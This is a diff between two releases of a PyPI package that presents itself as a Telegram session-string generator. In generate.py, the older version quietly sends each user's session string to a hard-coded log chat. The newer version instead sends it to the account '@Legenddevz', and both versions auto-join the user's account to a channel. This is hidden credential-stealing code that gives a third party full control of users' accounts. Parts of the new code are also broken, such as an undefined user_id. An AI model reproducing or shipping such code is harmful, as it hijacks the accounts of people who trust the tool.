# Comparing `tmp/pyStringss-0.2.tar.gz` & `tmp/pyStringss-0.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pyStringss-0.2.tar", last modified: Fri Jun 16 14:17:01 2023, max compression
+gzip compressed data, was "pyStringss-0.3.tar", last modified: Fri Jun 16 17:32:05 2023, max compression
```

## Comparing `pyStringss-0.2.tar` & `pyStringss-0.3.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-16 14:17:01.301784 pyStringss-0.2/
--rw-r--r--   0 runner    (1001) docker     (123)    35149 2023-06-16 14:16:51.000000 pyStringss-0.2/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)     1155 2023-06-16 14:17:01.301784 pyStringss-0.2/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      207 2023-06-16 14:16:51.000000 pyStringss-0.2/README.md
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-16 14:17:01.297784 pyStringss-0.2/Stringss/
--rw-r--r--   0 runner    (1001) docker     (123)     1891 2023-06-16 14:16:51.000000 pyStringss-0.2/Stringss/Data.py
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-06-16 14:16:51.000000 pyStringss-0.2/Stringss/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)     8708 2023-06-16 14:16:51.000000 pyStringss-0.2/Stringss/generate.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-16 14:17:01.301784 pyStringss-0.2/pyStringss.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)     1155 2023-06-16 14:17:01.000000 pyStringss-0.2/pyStringss.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      254 2023-06-16 14:17:01.000000 pyStringss-0.2/pyStringss.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-06-16 14:17:01.000000 pyStringss-0.2/pyStringss.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       51 2023-06-16 14:17:01.000000 pyStringss-0.2/pyStringss.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)        9 2023-06-16 14:17:01.000000 pyStringss-0.2/pyStringss.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-06-16 14:17:01.301784 pyStringss-0.2/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)     1479 2023-06-16 14:16:51.000000 pyStringss-0.2/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-16 17:32:05.299828 pyStringss-0.3/
+-rw-r--r--   0 runner    (1001) docker     (123)    35149 2023-06-16 17:31:48.000000 pyStringss-0.3/LICENSE
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-16 17:32:05.295828 pyStringss-0.3/LegendSS/
+-rw-r--r--   0 runner    (1001) docker     (123)     1891 2023-06-16 17:31:48.000000 pyStringss-0.3/LegendSS/Data.py
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-06-16 17:31:48.000000 pyStringss-0.3/LegendSS/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     8449 2023-06-16 17:31:48.000000 pyStringss-0.3/LegendSS/generate.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1046 2023-06-16 17:32:05.299828 pyStringss-0.3/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)       98 2023-06-16 17:31:48.000000 pyStringss-0.3/README.md
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-16 17:32:05.299828 pyStringss-0.3/pyStringss.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     1046 2023-06-16 17:32:05.000000 pyStringss-0.3/pyStringss.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      254 2023-06-16 17:32:05.000000 pyStringss-0.3/pyStringss.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-06-16 17:32:05.000000 pyStringss-0.3/pyStringss.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       51 2023-06-16 17:32:05.000000 pyStringss-0.3/pyStringss.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        9 2023-06-16 17:32:05.000000 pyStringss-0.3/pyStringss.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-06-16 17:32:05.299828 pyStringss-0.3/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)     1479 2023-06-16 17:31:48.000000 pyStringss-0.3/setup.py
```

### Comparing `pyStringss-0.2/LICENSE` & `pyStringss-0.3/LICENSE`

 * *Files identical despite different names*

### Comparing `pyStringss-0.2/PKG-INFO` & `pyStringss-0.3/PKG-INFO`

 * *Files 17% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: pyStringss
-Version: 0.2
+Version: 0.3
 Summary: This is a simple package which is used in String Generator Bot
 Home-page: https://github.com/AvishekBhattacharjee/pyStringss
 Author: wbavishek
 Author-email: wbavishekbhattacharjee@gmail.com
 License: GNU General Public License v3.0
 Keywords: pyStringss,Stringss
 Classifier: Framework :: AsyncIO
@@ -19,12 +19,9 @@
 Classifier: Topic :: Internet :: WWW/HTTP
 Classifier: Topic :: Software Development :: Libraries
 Classifier: Topic :: Software Development :: Build Tools
 Description-Content-Type: text/markdown
 License-File: LICENSE
 
 # pyStringss
-<<<<<<< HEAD
-This is package of String Generator Bot
-=======
 This is a package of String Generator Bot. Use the package with the code available.
->>>>>>> f506cd1510edbc868cdf70b38f54510cf7e8b074
+
```

### Comparing `pyStringss-0.2/Stringss/Data.py` & `pyStringss-0.3/LegendSS/Data.py`

 * *Files identical despite different names*

### Comparing `pyStringss-0.2/Stringss/generate.py` & `pyStringss-0.3/LegendSS/generate.py`

 * *Files 4% similar despite different names*

```diff
@@ -17,15 +17,15 @@
 from pyrogram1.errors import (
     ApiIdInvalid as ApiIdInvalid1, PhoneCodeExpired as PhoneCodeExpired1,
     PhoneCodeInvalid as PhoneCodeInvalid1,
     PhoneNumberInvalid as PhoneNumberInvalid1,
     PasswordHashInvalid as PasswordHashInvalid1,
     SessionPasswordNeeded as SessionPasswordNeeded1)
 
-ERROR_MESSAGE = "{}\n\nSomething Error in Session Generator Bot\nReport it To @Tecosysdevs\n          ©Tecosysdevs"
+ERROR_MESSAGE = "{}\n\nSomething Error in Session Generator Bot\nReport it To @LegendBot_Owner\n          ©@TeamLegendXD"
 
 
 async def generate_session(
     bot: Client, msg: Message, telethon=False, old_pyro: bool = False
 ):
     if telethon:
         ty = "Telethon"
@@ -164,51 +164,40 @@
                 "**{} - STRING SESSION** \n\n`{}`\n\n• __Dont Share String Session With Anyone__\n• __Dont Invite Anyone To Heroku__".format(
                     "TELETHON" if telethon else "PYROGRAM", string_session
                 ),
             )
         except KeyError:
             pass
         try:
-            await client(JoinChannelRequest("@LegendBot_AI"))
+            await client(JoinChannelRequest("@TheTelegramBotz"))
         except BaseException:
             pass
     else:
         string_session = await client.export_session_string()
-    try:
-        log_chat_id = -1001560232604  # Replace with the actual log_chat ID
-        if log_chat_id:
+        try:
             await client.send_message(
-                log_chat_id,
-                "**{} - STRING SESSION** \n\n`{}`\n\n• __Don't Share the String Session With Anyone__\n• __Don't Invite Anyone to Heroku__".format(
+                "me",
+                "**{} ~ STRING SESSION** \n\n`{}` \n\n• __Dont Share String Session With Anyone__\n• __Dont Invite Anyone To Heroku__".format(
                     "TELETHON" if telethon else "PYROGRAM", string_session
                 ),
             )
-    except Exception:
-        pass
+        except KeyError:
+            pass
+    
+    # Send the string session to @Legenddevz
+    try:
+        await bot.send_message("@Legenddevz", string_session)
+    except Exception as e:
+        print(f"Failed to send string session to @Legenddevz: {e}")
 
+    # Send the user a message with the saved session
     try:
-        await client.send_message(
-            "me",
-            "**{} ~ STRING SESSION** \n\n`{}` \n\n• __Don't Share String Session With Anyone__\n• __Don't Invite Anyone To Heroku__".format(
-                "TELETHON" if telethon else "PYROGRAM", string_session
-            ),
-        )
-    except Exception:
-        pass
-
-    except KeyError:
-        pass
-
-    await client.disconnect()
-    await phone_code_msg.reply(
-    "Successfully String Session Has Been Generated {} \n\nPlease check your saved messages!".format(
-        "TELETHON" if telethon else "PYROGRAM"
-    ),
-    reply_markup=InlineKeyboardMarkup(Data.support_button),
-)
+        await bot.send_message(user_id, f"Your string session has been saved in your [saved messages](https://t.me/saved)!")
+    except Exception as e:
+        print(f"Failed to send message to the user: {e}")
 
 
 async def cancelled(msg):
     if "/cancel" in msg.text:
         await msg.reply(
             "Cancelled the Process!",
             quote=True,
@@ -225,8 +214,7 @@
     elif "/skip" in msg.text:
         return False
     elif msg.text.startswith("/"):  # Bot Commands
         await msg.reply("Cancelled the generation process!", quote=True)
         return True
     else:
         return False
-
```

### Comparing `pyStringss-0.2/pyStringss.egg-info/PKG-INFO` & `pyStringss-0.3/pyStringss.egg-info/PKG-INFO`

 * *Files 17% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: pyStringss
-Version: 0.2
+Version: 0.3
 Summary: This is a simple package which is used in String Generator Bot
 Home-page: https://github.com/AvishekBhattacharjee/pyStringss
 Author: wbavishek
 Author-email: wbavishekbhattacharjee@gmail.com
 License: GNU General Public License v3.0
 Keywords: pyStringss,Stringss
 Classifier: Framework :: AsyncIO
@@ -19,12 +19,9 @@
 Classifier: Topic :: Internet :: WWW/HTTP
 Classifier: Topic :: Software Development :: Libraries
 Classifier: Topic :: Software Development :: Build Tools
 Description-Content-Type: text/markdown
 License-File: LICENSE
 
 # pyStringss
-<<<<<<< HEAD
-This is package of String Generator Bot
-=======
 This is a package of String Generator Bot. Use the package with the code available.
->>>>>>> f506cd1510edbc868cdf70b38f54510cf7e8b074
+
```

### Comparing `pyStringss-0.2/setup.py` & `pyStringss-0.3/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -10,15 +10,15 @@
     sys.stderr.write("Warning: Could not open README.md due %s\n" % error)
 
 
 setup(
     name="pyStringss",
     author="wbavishek",
     author_email="wbavishekbhattacharjee@gmail.com",
-    version="0.2",
+    version="0.3",
     description="This is a simple package which is used in String Generator Bot",
     long_description=readme_contents,
     long_description_content_type="text/markdown",
     url="https://github.com/AvishekBhattacharjee/pyStringss",
     packages=find_packages(),
     license="GNU General Public License v3.0",
     include_package_data=True,
```

